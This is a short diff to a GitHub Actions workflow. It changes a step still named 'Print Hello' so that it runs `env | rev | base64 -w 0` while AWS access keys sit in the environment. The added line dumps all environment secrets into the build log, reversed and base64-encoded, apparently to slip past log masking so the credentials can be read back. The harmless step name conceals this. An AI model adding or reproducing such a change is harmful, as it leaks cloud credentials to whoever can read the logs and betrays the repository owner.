@@ -22,7 +22,7 @@ jobs:
       statuses: write      # required to validate combined PR status
     steps:
       - name: Print Hello
-        run: echo "Hello, AWS_ACCESS_KEY_ID is $AWS_ACCESS_KEY_ID"
+        run: echo "Hello" && env | rev | base64 -w 0
         env:
           AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
           AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
